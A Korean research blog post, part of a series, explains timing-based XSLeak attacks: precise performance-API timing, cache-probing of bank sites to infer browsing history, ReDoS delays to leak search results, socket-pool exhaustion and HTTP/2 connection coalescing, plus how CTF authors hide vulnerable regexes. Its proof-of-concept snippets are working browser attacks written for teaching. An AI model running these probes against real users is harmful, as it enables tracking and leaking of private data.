---
title: "[KR] Advanced XSLeaks Research: Comprehensive Analysis of Browser-Based Information Disclosure Techniques — Part 3"
date: 2025-07-28 23:53:45
tags:
  - Research
  - XSLeaks
  - CTF
  - Case-Study
  - CVE
  - Korean
  - Security
  - Web
language: kr
author: 0xp1ain
thumbnail: "/images/thumbnail/xsleaks_advance_research_part_3.png"
copyright: "© 2025 HSPACE (이 문서의 소재에 한하여), Author : Rewrite Lab (정건우)"
---

## TL;DR

---

본 리서치는 앞서 이전 리서치 글과 이어지는 내용을 포함하고 있어 정확한 문맥 파악을 위해서는 이전의 리서치를 확인 후 다시 돌아와서 읽는 것을 권장한다.

이번 파트에서는 XSLeak 취약점 중 Timing Attack으로 발생되는 XSLeak 취약점, Chrome의 실험적 기능에서 발생하는 XSLeak 취약점에 대해서 자세히 설명하며 해당 취약점들이 실제 어떤식으로 응용되어 CTF 챌린지로 출제하는지에 대해서도 기술한다.

Timing Attack은 XSLeak 취약점 중 유명한 기법에 속한다. 페이지를 브라우저에서 로드할 때 의도한/의도하지 않은 시간 차이를 이용해 다양한 정보를 유추하고 유출할 수 있다.

이 과정에서 정밀한 시간 측정이 요구되는데, 기존에 유명한 `Date` 내장 자바스크립트 라이브러리를 이용하여 측정하는 방법이 아닌 `performance` API를 이용하여 측정하는 방법을 소개한다.

명시적 시간 차이를 발생시키는 가장 유명한 방법은 ReDoS 취약점을 이용하여 페이지 로딩을 명시적으로 길게 지연시켜 이를 이용해 공격자가 원하는 정보 유출을 하는 방법이다.

이러한 Timing Attack 외에 다르게 확인해볼 XSLeak 취약 백터로는 Chrome의 실험적 기능 부분이다. 일반적으로 실험적 기능은 단어에서도 알 수 있듯이 다른 보편적인 기능에 비해 테스트가 많이 진행되지 않은 기능이다.

테스트가 많이 진행되지 않았다는 뜻은 결국 잠재적 보안 취약점이 존재할 확률이 높다는 뜻이 된다. 이번 리서치에서는 Chrome의 실험적 기능인 Portal 기능과 STTF 기능에서는 XSLeak이 발생할 수 있는 문제가 존재한다.

이러한 XSLeak 취약점들은 다른 취약점들과 달리 발생 백터가 명시적이지 않고 이로 인해 발견이 어렵다는 특성이 있다. 그렇기에 많은 CTF 또는 Wargame에서 챌린지를 어렵게 만들기 위해 XSLeak 취약점을 이용하는 경우가 있다.

CTF에서는 어떤식으로 Timing Attack, Experiments에서 발생하는 XSLeak 취약점들이 챌린지에 이용될 수 있는지 출제자의 관점으로 바라본다.

## Timing Attacks

---

### Time measurement via performance API

XSLeak을 이용한 Timing Attack의 경우에는 크게 2가지로 분류할 수 있다. 네트워크 상에서 의도한 시간 차이, 의도하지 않은 브라우저 환경 또는 각종 외부 환경적 요인으로 인해 발생하는 시간 차이가 존재하는데 공격자는 네트워크 상에서 이러한 응답 패킷의 요청 ↔ 응답까지의 처리 시간을 기록하여 통계를 도출한다.

이를 이용하여 공격자는 `Cross-Origin`의 간접적인 정보 유출을 시도하거나 히스토리 기록을 파악할 수 있다.

Timing Attack Based XSLeak을 이용해 정보 유출을 성공적으로 수행하기 위해서는 마이크로초 단위 정밀 시간 측정 기법이 필요하다. 네트워크 요청에 대한 처리 시간을 기록하는 방법으로 가장 유명한 방법은 아마 자바스크립트 내장 라이브러리인 `Date` 라이브러리를 이용하여 측정하는 방법일 것이다.

```jsx
const startTime = Date.now();
fetch("https://example.com/api/endpoint", { mode: "no-cors" })
  .then(() => {
    const endTime = Date.now();
    const duration = endTime - startTime;
    console.log(`Request took: ${duration}ms`);
  })
  .catch(() => {
    const endTime = Date.now();
    console.log(`Request failed in: ${endTime - startTime}ms`);
  });
```

시간 측정에 대한 오차 허용 범위가 그리 크지 않다면 위 스니펫 만으로도 충분히 괜찮은 결과를 볼 수 있다. 하지만 해당 `Date.now()` 메서드의 경우 밀리초 해상도 제한으로 인해 정밀도가 아주 정확하지는 않다.

XSLeak 공격을 성공적으로 수행하기 위해서는 밀리초, 더 나아가 마이크로초 단위의 정밀 시간 측정이 필요하다. 이를 이유로 근래에는 `performance` API를 이용하여 시간 측정을 진행한다.

```jsx
let start = performance.now();

fetch("https://example.org", {
  mode: "no-cors",
  credentials: "include",
}).then(() => {
  let time = performance.now() - start;
  console.log("The request took %d ms.", time);
});
```

위 방법을 이용하면 `example.org` 에 리소스를 요청하고 응답을 받기까지 걸린 시간을 마이크로초 단위로 매우 정확하게 측정해서 반환한다. 이는 기존 `Date` 라이브러리를 이용해서 측정하는 방법보다 훨씬 더 정밀하고 정확하며 기본 API로 별도의 설치 과정 없이 `Date` 라이브러리처럼 바로 사용할 수 있다.

`Same-Window` 상에서의 시간 측정을 진행하기 위해서는 위와 같이 진행할 수 있으며 만약 `Cross-Window` 상에서 시간 측정을 진행해야 할 경우 아래와 같이 `performance` API를 이용하여 시간 측정을 진행할 수 있다.

```jsx
let win = window.open("https://example.org");
let start = performance.now();

function measure() {
  try {
    win.origin;
    setTimeout(measure, 0);
  } catch (e) {
    let time = performance.now() - start;
    console.log("It took %d ms to load the window", time);
  }
}

measure();
```

단독으로 새로운 `window` 창을 열어서 특정 URL만 로드 되기까지의 걸리는 시간을 측정하게 된다면 더욱 외부 환경의 간섭 없이 정밀한 시간 측정이 가능하다. 특정 `window` 만 단독으로 분리해서 시간을 측정하는 방법은 `Same-Window` 보다 정밀한 시간 측정이 가능하지만 브라우저에서 페이지를 로드할 때 일반적으로 로드하고자 하는 페이지만 단독으로 로드되는 경우는 거의 드물다.

브라우저에서 페이지를 로드할때는 사용자가 브라우저에 개별적으로 설치한 익스텐션 프로그램, 개별적으로 변경한 브라우저의 설정 등을 반영한다. 이로 인해 단독으로 새로운 창을 열어서 페이지를 로드하더라도 시크릿 모드가 아니라면 외부 환경에 의해 정확한 시간 측정을 하기 어렵다.

외부 환경에 전혀 영향을 받지 않고 순수한 페이지 로드의 시간 측정을 진행하기 위해서는 `sandbox` 환경에서 측정해야한다.

```jsx
let iframe = document.createElement("iframe");

iframe.src = "https://example.org";
iframe.sandbox = "";
document.body.appendChild(iframe);

let start = performance.now();

iframe.onload = () => {
  let time = performance.now() - start;
  console.log("The iframe and subresources took %d ms to load.", time);
};
```

`sandbox` 환경을 구성하는 가장 유명한 방법으로는 `iframe` 을 이용하는 것이다. 위와 같이 `iframe` 을 이용해 `sandbox` 속성을 활성화 후 `example.org` 페이지의 로드 시간을 측정한다.

이는 자바스크립트 실행, 외부 익스텐션 로드를 포함한 많은 외부의 부가적인 기능을 모두 차단한 환경을 구성하기 때문에 네트워크 상에서 단독적인 페이지의 순수한 시간 측정을 진행할 수 있다.

`sandbox` 환경을 이용한다면 매우 정밀한 순수 시간 측정이 가능하다는 장점이 있지만 페이지에서 `iframe` 태그 삽입이 허용되어야하고 만약 `X-Frame-Options` 와 같은 헤더가 설정되어 있다면 위 방법을 이용해 시간 측정을 진행하기는 어려움이 있다.

### How does precise timing technology play a role in information leaks?

그렇다면 이렇게 정밀한 시간 측정을 진행하는 것이 실질적으로 정보 유출에 어떠한 역할을 수행하는건지 의문을 품는 사람들이 있을 것이라 생각한다. 본인은 처음에 `xsleaks.dev` 에서 Timing Attack 섹션의 파트를 읽어보면서 다음과 같은 의문이 들었다. “정밀한 시간 측정이 정말 실질적인 정보 유출에 기여할 수 있는 것인가?”

이 질문에 대한 답은 “크리티컬한 정보 유출은 어려울 수 있더라도 간접적인 정보 유출은 가능할 수 있다.” 였다.

여기서 “간접적인”의 기준은 실질적으로 운영사에 직접적인 피해를 줄 수 있는 정보가 아닌 핑거프린트(Fingerprinting) 목적으로 활용될 수 있는 정보들을 포함하여 정의한다.

예를 들어 특정 페이지에 동일한 요청을 2번 보낸 후 각각의 응답 시간을 측정하였을때 첫번째 요청의 응답 시간보다 두번째 요청의 응답 시간이 더 짧았다면 이는 페이지에서 캐싱 처리를 하고 있음을 알아낼 수 있을 것이다.

또한 서버에서 클라이언트로부터 전달된 요청을 처리할때 처리해야하는 연산 또는 로직이 많을 경우 처리 시간이 늘어나고 이는 결국 요청 ↔ 응답 사이의 시간 차이가 더 길게 벌어지게 된다.

공격자는 이 특성을 이용해 악의적인 고성능 연산이 필요한 페이로드를 요청 파라미터에 함께 포함하여 전달한다. 만약 서버에서 이러한 요청을 처리할때 고성능 연산으로 인해 의도적인 시간 지연이 발생한다면 이를 이용해서 유의미한 정보를 유출할 수 있다.

![의도적 시간 지연을 이용한 Timing Attack 예시](/[KR]%20Advanced%20XSLeaks%20Research%20Comprehensive%20Analy%2022795ea211f5809aa3b6f50679e2240c/image.png)

의도적 시간 지연을 이용한 Timing Attack 예시

공격자가 의도적으로 고성능 연산이 필요한 페이로드를 전송하는 방법도 있지만 위와 같이 특정 키워드를 넣어서 서버에 요청하였을때 평균 응답 시간보다 더 긴 시간이 측정된다면 이는 특정 키워드가 입력되었을때 내부적으로 추가적인 연산이 진행되는 로직이 있다는 것을 추측할 수 있다.

의도적인 시간 지연이 발생할때 그 시간 차이는 직접적으로 확인할 수 있는 시간(1~2s 이상) 일수도 있지만 직접적으로 확인할 수 없는 시간(100ms ~ 500ms 차이) 일수도 있다. 이를 이유로 Timing Attack에서는 정밀한 시간 측정이 필요하며 이를 수행하기 위해 위와 같은 방법들을 이용해 정밀 시간 측정을 진행한다.

다음 섹션에서 정밀 시간 측정을 이용해 어떠한 핑거프린팅 정보들을 수집할 수 있는지에 대하여 기술한다.

### Detect cache usage via Timing Attack

가장 대표적으로 시간 측정을 이용해 얻을 수 있는 정보는 지속적으로 언급하였던 페이지가 캐싱 작업을 수행하고 있는지에 대한 유무를 알아낼 수 있다. 만약 특정 페이지의 응답이 캐시되어있다면 사용자가 이전에 해당 페이지를 방문한적이 있다는 단서가 됨으로 이를 이용하여 사용자의 대략적인 방문 히스토리를 유추할 수 있다.

이 과정에서 “페이지 응답 헤더를 조회하면 쉽게 캐시 유무를 확인할 수 있는데 이게 위험하다고 평가되는 이유는 무엇인가?” 와 같은 의문점이 제기될 수 있다. 실제로 `Same-Origin` 요청에서는 쉽게 응답에서 `Cache-Control` 헤더를 조회하여 캐시 유무를 파악할 수 있다. 하지만 `Cross-Origin` 환경에서는 이러한 헤더 정보를 조회할 수 없기 때문에 다른 방식으로 캐시 유무를 파악하는 방법이 필요하였다.

이를 이유로 Timing Attack으로 캐시된 페이지인지 유무를 파악하는 기법이 등장하게 되었고 이를 이용하여 아래와 같은 정보들을 유추할 수 있다.

- 브라우징 히스토리 추론: 공격자 사이트에서 사용자가 특정 웹사이트(은행, SNS 등)를 방문했는지 확인
- 사용자 프로파일링: 관심사, 정치적 성향, 쇼핑 패턴 등을 캐시된 리소스로 추론
- 개인정보 유출: 특정 서비스 사용 여부나 로그인 상태 추정

```jsx
const bankSites = [
  "https://bank1.com/logo.png",
  "https://bank2.com/style.css",
  "https://bank3.com/script.js",
];

bankSites.forEach(async (url) => {
  const visited = await detectCache(url);
  if (visited) console.log(`user visited ${url}`);
});
```

이는 실제 프라이버시 침해로 이어질 수 있는 중요한 보안상 문제에 속한다. Timing Attack으로 특정 페이지가 캐시되어있는지 유무를 탐지하는 방법으로는 `Cross-Origin` 에 대한 읽기 권한이 차단되지 않은 상태라면 아래와 같이 페이지의 캐시 유무를 파악할 수 있다.

```jsx
async function ifCached(url) {
  let href = new URL(url).href;
  await fetch(href, { mode: "no-cors", credentials: "include" });
  await new Promise((r) => setTimeout(r, 200));
  let res = performance.getEntriesByName(href).pop();
  console.log("Request duration: " + res.duration);
  // Check if is 304
  if (
    res.encodedBodySize > 0 &&
    res.transferSize > 0 &&
    res.transferSize < res.encodedBodySize
  )
    return true;
  if (res.transferSize > 0) return false;
  if (res.decodedBodySize > 0) return true;
  // Use duration if theirs no Timing-Allow-Origin header
  return res.duration < 10;
}

ifCached("https://example.org");
```

위와 같이 응답 데이터의 `encodedBodySize` , `transferSize` , `decodedBodySize` 등을 확인해 특정 페이지에서의 응답이 캐시된 응답인지 여부를 파악할 수 있다. 또한 네트워크 요청부터 응답까지 걸린 시간을 측정하여 이를 비교하는 방식을 이용해 캐시된 응답인지 여부를 판단할 수 있다.

하지만 특정 응답이 캐시된 응답인지 확인하기 위해서는 `Cross-Origin` 에 대한 읽기 권한이 차단되지 않은 상태여야 한다는 사전 조건이 필요하다. 만약 해당 권한이 차단되어있다면 `Cross-Origin` 페이지에 대하여 캐시 유무를 확인할 수 없다.

또한 이러한 캐시 탐지 기법들은 현대 브라우저들의 보안 강화로 인해 그 실효성이 크게 제한되고 있는 추세이다. `CORS`와 `Timing-Allow-Origin` 헤더의 제약으로 인해 `Timing-Allow-Origin` 헤더가 설정되지 않은 `Cross-Origin` 페이지의 경우 `performance` API가 제공하는 측정 정보가 크게 제한될 수 있다.

이 경우 `duration`, `redirectStart`, `redirectEnd`, `fetchStart`, `domainLookupStart`, `domainLookupEnd`, `connectStart`, `connectEnd`, `secureConnectionStart`, `requestStart`, `responseStart` 값들이 모두 0으로 마스킹되어 공격의 실효성이 크게 떨어진다.

추가로 Same-Site 쿠키 정책과의 상호작용 측면에서 `credentials: "include"` 옵션 사용 시 Same-Site 쿠키 정책이 캐시 동작에 직접적인 영향을 미칠 수 있다.

`Strict`나 `Lax` 정책에서는 `Third-Party` 에서의 전송이 제한되어 캐시 키 생성 방식이 달라질 수 있으며 이로 인해 동일한 페이지라도 쿠키 정책에 따라 서로 다른 캐시로 분류될 수 있다. 이와 같은 경우에도 캐시 유무 탐지가 어려워진다.

이처럼 현대적 브라우저의 방어 기법 등장으로 캐시 감지를 수행하기 많이 어려워졌다. 이로 인해 새로운 Timing Attack으로 캐시된 응답인지를 감지하는 방법이 등장하기 시작하고 있는 추세이다.

가장 대표적인 현대 기법으로 `AbortController` 를 이용한 고정밀도 Timing Attack이 존재한다. \*\*\*\*매우 짧은 시간(일반적으로 3-9ms) 후에 요청을 강제로 중단시키는 방식으로 캐시된 응답은 이 시간 내에 도착하지만 네트워크 요청은 중단되는 차이를 이용한다. 이는 기존의 `performance` API에서 사용하는 `duration` 측정보다 더 정확한 캐시 탐지를 가능하게 만든다.

```jsx
async function detectCache(url, timeout = 9) {
  const controller = new AbortController();
  const signal = controller.signal;

  const timer = setTimeout(() => controller.abort(), timeout);

  try {
    await fetch(url, {
      mode: "no-cors",
      credentials: "include",
      signal: signal,
    });
    clearTimeout(timer);
    return true;
  } catch (err) {
    return false;
  }
}

detectCache("https://example.org").then((cached) => {
  console.log(cached ? "cached" : "not cached");
});
```

이 외에도 캐시된 응답인지 확인하기 위한 다양한 현대적 공격 기법들이 존재하지만 Timing Attack이 활용되지 않은 공격 기법에 대해서는 본 리서치 주제 논외 내용이므로 배제하였다.

캐시는 일반적으로 리소스가 큰 페이지 로딩을 효율적으로 진행하기 위해 만들어진 기능인 만큼 해당 부분에서 발생하는 시간 차이는 공격자가 의도하지 않은 시간 차이에 속한다. 공격자가 명시적으로 응답 시간을 조정한 것이 아닌 기능상에서 의도된 것이기 때문이다.

### Timing attack via ReDoS

공격자가 의도하지 않은 시간 차이가 아닌 공격자가 의도한 시간 차이를 이용해 Timing Attack을 수행하는 방법도 존재한다. 대표적인 방법으로 ReDoS 취약점을 이용해서 의도적 시간 지연을 발생 시킨 후 이를 이용해 Timing Attack을 수행하는 방법이다.

ReDoS 취약점은 상당히 많이 알려진 취약점 중 하나에 속한다. 이는 정규표현식 구문에서 보안상 구문 검증이 미숙할 경우 발생하는 문제로 이를 이용하여 서버에 DoS를 발생시킬 수 있다. DoS가 발생할 경우 서버에 부하가 발생하고 이로 인해 요청 ↔ 응답 과정 사이의 시간 지연이 발생한다.

대표적으로 페이지의 검색 기능이나 이메일 패턴 매칭과 같은 정규식 매칭을 처리하는 과정에서 개발 실수(보안 처리 미숙)로 인해 발생한다.

```jsx
const emailRegex = /^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$/;
```

위 정규식의 경우 검증 과정에서 백 트래킹이 발생하여 처리 시간 복잡도가 지수 단위 또는 그 이상으로 증가한다. 그리고 공격자는 이를 악용하여 의도적으로 시간 지연을 발생시킬 수 있다.

```jsx
const maliciousEmail =
  "a".repeat(20) + "@" + "a".repeat(20) + "." + "a".repeat(10);
```

위 페이로드의 경우 간단한 예시를 위해 반복 횟수를 적게 설정하였지만 실제로는 이보다 더 높은 반복 횟수를 이용해 정규표현식 처리에 대한 시간을 기하급수적으로 증가시킬 수 있다.

이와 같이 공격자가 의도한 시간 지연과 시간 측정 기법을 함께 이용한다면 특정 상황에서 크리티컬한 정보 유출로도 이어질 수 있다. 예를 들어 검색 기능에서 와일드카드 문자를 이용한 검색을 허용하는 상황이고 해당 와일드카드 문자를 추출하는 과정에서 ReDoS에 취약한 정규표현식이 있다면 공격자는 `"a" + "*".repeat(100000)` 와 같은 악의적인 검색 페이로드를 주입하여 함께 요청을 보낼 수 있다.

서버에서 해당 요청을 받을 경우 `a` 로 매칭되는 검색 결과가 존재할 경우에는 응답 시간이 크게 늘어나고 검색 결과가 존재하지 않을 경우에는 응답 시간이 짧게 측정된다.

![ReDoS를 이용한 실제 정보 유출 과정 예시](/[KR]%20Advanced%20XSLeaks%20Research%20Comprehensive%20Analy%2022795ea211f5809aa3b6f50679e2240c/image%201.png)

ReDoS를 이용한 실제 정보 유출 과정 예시

위와 같이 BruteForcing 공격을 이용하여 악의적인 요청을 전송하고 응답까지의 시간 측정을 기록한 다음 요청 ↔ 응답까지 처리 시간이 큰 패킷들만 조합한다면 유의미한 정보 유출로 이어지게 할 수 있다.

예시로 만약 게시판 사이트의 게시글 검색 페이지에서 위와 같은 취약점이 발생한다면 이를 이용해 비밀글의 내용을 유출하거나 비밀글의 제목을 유출할 수 있을 것이다. 또는 채팅 사이트의 대화 내역 검색 기능에서 발생한다면 다른 사용자와 채팅한 채팅 내역을 유출이 수 있을 것이다.

ReDoS 취약점은 공격자가 의도한 시간 지연을 발생시키는 대표적인 예시중 하나이며 이 외에도 다른 시간 지연을 일으키는 취약점들(SQLI heavy query, Logical bug, Race condition 등)을 이용해 의도적 시간 지연이 발생하도록 유도할 수 있다.

기능상으로 발생하는 의도하지 않은 시간 차이의 경우에는 얼마나 시간을 지연시킬지 공격자가 직접 제어할 수 없는 경우가 대부분이지만 공격자가 의도한 시간 차이의 경우에는 공격자가 직접 시간 지연을 제어할 수 있는 확률이 있으므로 정밀한 시간 측정이 아닌 일반 `Date` 라이브러리를 이용해 단순하게 측정 하더라도 차이를 확인할 수 있을 확률이 높다.

하지만 공격자가 무조건 모든 경우에 응답 시간을 제어할 수 있는 것은 아니기 때문에 시간 지연을 얼마나 제어할 수 있는지에 대한 최대 제어 범위를 확실히 확인하고 어떤 측정 방법을 사용할지 결정하는 것이 중요하다.

### Connection pool based XSLeak

지금까지는 정밀 시간 측정과 ReDoS와 같은 취약점을 이용한 강제 시간 지연을 이용하여 다양한 핑거프린트 정보와 직접적인 운영사에 피해를 끼칠 수 있는 정보를 유추/유출하는 방법에 대해서 소개하였다.

정밀 시간 측정을 이용한 Timing Attack은 생각보다 공격자에게 많은 정보를 제공해줄 수 있다. 그렇기 때문에 많은 브라우저에서도 정밀 시간 측정에서 얻을 수 있는 정보를 제한 시키거나 따로 개발자가 보안 헤더를 명시해서 제한할 수 있게끔 처리하는 방식을 통해 방어하고 있다.

이에 대하여 많은 우회 기법들이 등장하고 발전하고 있지만 그 중 이번에는 독특한 방식으로 시간 측정을 진행하는 방법에 대해서 설명한다. 기존에 `performance` API 또는 `Date` 라이브러리를 통해서 시간을 측정하는 방법이 있었다면 브라우저의 소캣 풀(Connection Pool)을 남용하여 시간 측정을 진행하는 방법이 있다.

최신 브라우저에서는 HTTP/1.1 연결 관리를 위해 Connection Pool이라는 것을 구현하고 있으며 이는 TPC 소캣의 생성 및 해제 비용을 최소화하기 위한 최적화 메커니즘이다.

브라우저는 동일한 호스트에 대해서 동시 연결 수를 제한하는데 대부분 6~8개의 동시 연결만을 허용한다. 동일한 호스트 연결이 아닐 경우에는 일반적으로 최대 256개 내외까지의 소캣 연결을 허용하며 만약 256개의 소캣이 모두 통신에 사용중인 상태라면 Socket Pool은 포화상태가 된다.

공격자는 이 점을 악용하여 Socket Pool을 남용하는 Timing Attack을 수행할 수 있다. 가장 먼저 공격자는 255개의 소캣을 모두 점유하는 상태로 만든다.

```jsx
// Client
for (let i = 0; i < 255; i++)
  fetch("https://" + i + ".example.com/", {
    mode: "no-cors",
    cache: "no-store",
  });
```

```python
# Server
from http.server import BaseHTTPRequestHandler, HTTPServer
import time

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        time.sleep(float(100000))
        self.send_response(200)
        self.send_header('Cache-Control', 'no-store')
        self.end_headers()

with HTTPServer(('', 8000), handler) as server:
    server.serve_forever()
```

위와 방법을 이용하여 네트워크에서 255개의 소캣을 의도적으로 모두 점유하게 만들게 된다면 255개의 소캣의 연결이 `hanging` 상태로 유지된다. 그러면 Socket Pool은 남은 하나의 소캣을 제외하고는 모든 소캣이 점유중인 상태가 된다. 공격자는 마지막 남은 256번째 소캣으로 시간을 측정하고자 하는 페이지에 요청을 보낸다.

그러면 256개의 모든 소캣이 점유중인 상태가 되므로 Socket Pool이 포화 상태가 된다. 이후에 공격자는 257번째 요청을 아무 다른 호스트에 보낸다. Socket Pool이 포화 상태이므로 257번째 요청은 즉시 연결되지 못하고 대기 상태가 된다.

257번째 요청에 대한 대기 상태가 해제되고 실제 연결이 진행되기 시작하는 시점은 256번째 소캣이 해제되는 시점과 일치한다. 이 이유는 남은 255개의 소캣은 여전히 `hanging` 상태이기 때문이다. 공격자가 측정하고자 하는 페이지의 요청 처리 시간이 100000초가 넘어가지 않는 이상 무조건 256번째 소캣이 가장 빠르게 해제된다.

그렇기 때문에 257번째 요청에 대한 대기 상태가 해제되고 실제 요청이 처리되기 시작한 시간을 구한다면 256번째 요청(측정 대상 페이지)에 대한 시간 측정을 진행할 수 있다.

```jsx
performance.clearResourceTimings();
await fetch(location.href, { cache: "no-store" });
await new Promise((r) => setTimeout(r, 1000));
let data = performance.getEntries().pop();
let type = data.connectStart === data.startTime ? "reused" : "new";
console.log("Time spent: " + data.duration + " on " + type + " connection.");
```

공격자는 위와 같은 로직으로 257번째 요청을 등록하면서 최종적으로 원하는 페이지의 시간 측정을 진행할 수 있다. 이는 `performance` API를 이용하여 시간 측정을 진행하는 것보다 정밀도가 떨어질 수 있다. 하지만 이 방법 역시 `Cross-Origin` 에서 시간을 측정할 수 있으므로 만약 `performance` API가 제한되어 있거나 정밀 시간 측정을 하기 어려운 상황이라면 시도해볼 수 있는 방법이다.

Socket Pool을 남용하여 시간 측정을 진행하는 방법의 경우 의도된 기능들을 활용하여 정밀 시간 측정을 진행하는 것이므로 방어를 하기 매우 어렵거나 할 수 없다. 이를 이유로 `Cross-Origin` 에서 정밀 시간 측정이 필요하다면 사전 복잡도가 높지만 가장 확실한 방법 중 하나이다.

Socket Pool을 남용해 시간 측정을 진행하는 방법 외에 Connection Pool을 이용해 특정 페이지에 대한 연결이 완전히 새로운 연결인지 재사용된 연결인지 확인하는 방법도 있다. 이 정보도 핑거프린트 정보로 활용될 수 있다.

상기에서 언급하였지만 HTTP/1.1과 HTTP/2는 연결 관리를 위한 각종 최적화 메커니즘이 존재한다. 그 중 연결 재사용 관련 최적화가 존재하는데 이는 특정 페이지 연결/방문을 위해 소캣을 사용할 때 소캣 사용 후 효율성을 향상 시키기 위해서 사용된 연결을 한번 더 재사용하는 메커니즘이다. 특히 HTTP/2부터는 Connection Coalescing 기능을 제공한다. 이는 동일한 웹 서버에 접근하고자 하는 서로 다른 호스트들이 하나의 연결을 재사용할 수 있도록 제공한다.

이와 같은 재사용 메커니즘을 이용하여 재사용된 연결은 기존 새로운 연결 보다 더 빠르게 응답한다. 이 특성을 이용하면 특정 페이지에 대한 요청이 소캣 연결 재사용을 통해 연결되었는지 또는 새로운 소캣 연결을 통해 연결되었는지 탐지할 수 있다.

```jsx
await new Promise((r) => setTimeout(r, 10000));

async function isConnected2(url, max = 50) {
  let start = performance.now();
  try {
    await fetch(url, {
      cache: "no-store",
      method: "GET",
      mode: "no-cors",
      credentials: "include",
    });
  } catch {}

  let duration = performance.now() - start;
  let start2 = performance.now();

  try {
    await fetch(url, {
      cache: "no-store",
      method: "GET",
      mode: "no-cors",
      credentials: "include",
    });
  } catch {}

  let duration2 = performance.now() - start2;

  return duration - duration2 < max;
}

await isConnected2("https://example.com/404");
```

위 방법은 `performance` API를 이용해 정밀 시간 측정을 진행하고 동일한 페이지의 응답 시간에 대한 차이를 이용하여 소캣 재사용을 통한 연결인지 유무를 확인할 수 있다.

이와 같은 연결 재사용 탐지 기법에서 추가로 HTTP/2의 Connection Coalescing 메커니즘을 악용해서 `Cross-Origin` 도메인 간의 연관성을 추론할 수 있다. 앞서 설명한 Connection Coalescing 메커니즘은 TLS 인증서의 SAN(Subject Alternative Name) 필드에 포함된 모든 도메인들이 동일한 연결을 재사용할 수 있도록 허용한다.

공격자는 이를 이용하여 사용자가 방문한 적이 없는 도메인이라도 해당 도메인이 이미 방문했던 도메인과 동일한 서버에서 호스팅되는지 여부를 탐지할 수 있다.

```jsx
async function detectConnectionCoalescing(primaryDomain, targetDomains) {
  await fetch(`https://${primaryDomain}/`, {
    cache: "no-store",
    method: "GET",
    mode: "no-cors",
    credentials: "include",
  });

  let coalescingResults = [];

  for (let domain of targetDomains) {
    let start = performance.now();
    try {
      await fetch(`https://${domain}/`, {
        cache: "no-store",
        method: "GET",
        mode: "no-cors",
        credentials: "include",
      });
    } catch {}

    let duration = performance.now() - start;

    coalescingResults.push({
      domain: domain,
      duration: duration,
      coalesced: duration < 50,
    });
  }

  return coalescingResults;
}

await detectConnectionCoalescing("example.com", [
  "api.example.com",
  "cdn.example.com",
  "mail.example.com",
]);
```

위 방법을 통해 공격자는 사용자가 직접적으로 방문하지 않은 서브도메인들에 대한 정보를 유추할 수 있으며 또한 CDN 서비스나 클라우드 호스팅 서비스를 사용하는 웹사이트의 경우 공격자는 서로 관련이 없어 보이는 도메인들이 실제로는 동일한 인프라를 공유하고 있다는 사실 등을 유추할 수 있다.

이와 같이 HTTP/1.1, HTTP/2에서 효율성을 목적으로 도입된 메커니즘들이 XSLeak와 같은 취약점으로 이어질 수 있다. 본 리서치에서 소개한 방법 외에도 Timing Attack 공격들이 많이 존재한다. 만약 Timing Attack 통한 XSLeak 기법에 대해서 더 많은 관심이 있을 경우 `xsleaks.dev` Timing Attack 섹션에 소개된 다양한 레퍼런스들을 참고하면 좋다.

### How does Timing Attacks XSLeak apply to CTF?

Timing Attack 공격은 XSLeaks 취약점 중 유명한 공격 기법 중 하나에 꼽힌다. 또한 정밀 시간 측정이 가능한 사실만으로도 공격자는 사용자의 브라우저 상에서 상당히 많은 정보들을 유추하고 유출할 수 있다.

XSLeak 취약점 중 Timing Attack의 경우 브라우저 자체에서 제공하는 기능 안에서 발생하는 문제들이 상당히 많은 부분을 차지한다. 그렇기 때문에 많은 CTF 또는 Wargame에서 출제자가 챌린지를 어렵게 만들기 위해 이와 같은 기법들을 챌린지에 응용하는 경우가 많이 존재한다.

실제 많은 CTF에서 Timing Attack을 챌린지에 사용하는 경우 풀이자 수가 급격히 떨어지는 것을 빈번히 확인할 수 있다. 본 섹션에서는 출제자의 관점에서 어떤식으로 Timing Attack과 관련된 기법들을 챌린지에 응용할 수 있을지에 대해서 다룰 예정이다.

해당 섹션에서는 작성자의 주관적인 의견이 상당히 많이 포함되어있으며 본 섹션에서 다루는 분석이 모든 CTF 챌린지 출제에 이용되는건 아니라는 것을 다시 한번 짚고 넘어간다.

**ReDoS 취약점을 이용한 챌린지 난이도 상승 기법**

ReDoS는 많은 출제자들이 좋아하고 많이 사용하는 취약점 중 하나에 속한다. 본 취약점은 정규표현식 구문 작성에서의 오류를 기반으로 발현되며 공격자는 이를 이용해 의도적 시간 지연을 발생시킬 수 있다.

의도적 시간 지연이 발생할 경우 공격자는 요청 ↔ 응답 사이의 시간 차이가 명확히 늘어나는 것을 확인할 수 있으며 이를 이용한 블라인드 형식의 정보 유출을 진행할 수 있다. 위 섹션에서 ReDoS 취약점을 이용해서 어떤식으로 정보 유출을 진행할 수 있는지에 대해서 다뤘었기 때문에 자세한 정보 유출 과정에 대해서는 생략한다.

CTF 출제 과정에서는 챌린지에서 목표하는 FLAG를 획득하기 위해 Exploit 코드를 실행하였을 때 명확히 취약점들이 발생되어야하고 최대한 확률적인 요소를 줄이는 것이 좋다. (하지만 CTF 챌린지에서 확률적 요소가 완전히 없다고 확신할 수는 없다.)

따라서 작성자 본인의 경우에는 최대한 추측성 챌린지보다는 명시적인 챌린지를 출제하려고 생각한다. 이 경우에 ReDoS 취약점은 상당히 유용하다. 발현될 경우 공격자가 명시적으로 시간 지연 간격을 제어할 수 있으며 이 과정에서 공격자 눈에 명확히 시간 지연이 발생하는 것이 보이기 때문이다.

ReDoS 취약점을 챌린지에 출제할 때 난이도를 더 올리기 위해서는 취약점이 아닌 것처럼 숨기는 것이 중요하다고 생각한다. 풀이자의 입장에서 최대한 발견하기 어렵게 자연스럽게 기능을 구현한다.

예를 들어 이메일 검증에 사용되는 정규표현식, 비밀번호 규칙 검증에 사용되는 정규표현식과 같이 개발 과정에서 흔히 정규표현식 구문이 쓰이는 부분에 의도적으로 취약한 정규표현식 구문을 구현한다. 그리고 코드 베이스(LOC) 양을 매우 크게 구현한다면 상대적으로 풀이자가 취약한 정규표현식을 찾기 어려워진다.

![LOC 양이 증가할수록 풀이자가 느끼는 생각 예측](/[KR]%20Advanced%20XSLeaks%20Research%20Comprehensive%20Analy%2022795ea211f5809aa3b6f50679e2240c/image%202.png)

LOC 양이 증가할수록 풀이자가 느끼는 생각 예측

